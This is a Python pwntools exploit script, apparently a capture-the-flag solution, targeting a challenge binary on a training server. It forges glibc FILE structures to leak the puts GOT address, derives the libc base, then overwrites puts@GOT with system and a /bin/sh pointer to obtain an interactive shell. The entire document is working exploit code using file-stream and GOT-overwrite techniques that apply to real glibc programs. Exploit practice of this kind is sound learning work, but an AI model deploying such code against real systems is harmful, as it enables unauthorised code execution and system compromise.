#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.terminal = ["alacritty", "-e", "fish", "-c"]

gdbscript = """
    continue
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote("training.theromanxpl0.it", 42076)

    return r

def main():
    r = conn()
    # p *(struct _IO_FILE_plus*)file_ptr
    # p *(FILE*)file_ptr

    puts_got = exe.got["puts"]

    fp = FileStructure()
    fp.flags = 0x00
    fp._IO_read_ptr = puts_got
    fp._IO_read_end = puts_got + 8
    fp._IO_read_base = puts_got
    fp.fileno = 0

    # partial RELRO
    payload = fp.struntil("fileno")
    payload.ljust(256, b"\x00")

    r.sendlineafter(b">> ", b"1")
    r.sendlineafter(b">> ", b"4")    
    r.send(payload)

    r.sendlineafter(b">> ", b"3")
    r.send(b"A" * 8)
    leak = u64(r.recv(6).ljust(8, b"\x00"))
    log.info(hex(leak))

    libc.address = leak - libc.sym.puts
    log.info(f"libc base: {hex(libc.address)}")

    log.info(f"{hex(exe.got.puts)}")

    # OVERWRITE GOT ENTRY
    binsh = libc.address + 0x1d8678
    fp = FileStructure()
    fp.flags = 0x00
    fp._IO_buf_base = exe.got.puts
    fp._IO_buf_end = exe.got.puts + 20
    fp._IO_read_ptr = binsh
    fp._IO_read_end = binsh + 8
    fp._IO_read_base = binsh
    fp.fileno = 0

    payload = fp.struntil("fileno")
    payload.ljust(256, b"\x00")
    r.sendlineafter(b">> ", b"4")    
    r.send(payload)

    r.sendlineafter(b">> ", b"3")
    r.send(p64(libc.sym.system).ljust(20, b"\x00"))
    
    r.interactive()

if __name__ == "__main__":
    main()
